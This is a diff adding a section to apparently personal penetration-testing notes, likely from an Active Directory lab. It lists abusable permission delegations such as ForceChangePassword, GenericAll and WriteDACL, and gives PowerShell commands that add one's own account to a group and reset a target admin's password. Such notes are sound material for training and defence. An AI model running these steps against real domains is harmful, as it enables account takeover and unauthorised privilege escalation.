@@ -1,3 +1,22 @@
+#AD Exploit Permission Delegation
++ ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
++ AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
++ GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
++ GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
++ WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
++ WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
++ AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
+
+	PS C:\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
+	PS C:\>Get-ADGroupMember -Identity "IT Support" -> you will see your account added to gropu IT Support
+	****** ForceChangePassword
+	PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins" -> find user interest to resent their password
+ 	
+	PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
+	PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
+
+	***** Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run gpupdate /force and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
+    
 # Pivoting
 
 Sshuttle Command:
